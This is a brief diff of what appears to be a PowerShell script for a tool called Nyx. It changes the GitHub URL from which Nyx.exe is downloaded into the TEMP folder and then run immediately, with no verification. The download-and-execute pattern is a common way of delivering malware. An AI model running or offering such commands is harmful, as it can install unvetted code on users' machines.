@@ -1,7 +1,7 @@
 #Nyx - 20230220-01
 
 # Download and run Nyx.exe
-Invoke-WebRequest https://raw.githubusercontent.com/VVolfCZ/ProjectNyx/main/Nyx.exe -OutFile "$env:TEMP\Nyx.exe"
+Invoke-WebRequest https://raw.githubusercontent.com/VVolfCZ/ProjectNyx/main/20230220-01/Nyx.exe -OutFile "$env:TEMP\Nyx.exe"
 & "$env:TEMP\Nyx.exe"
 
 # Change Nyx Name
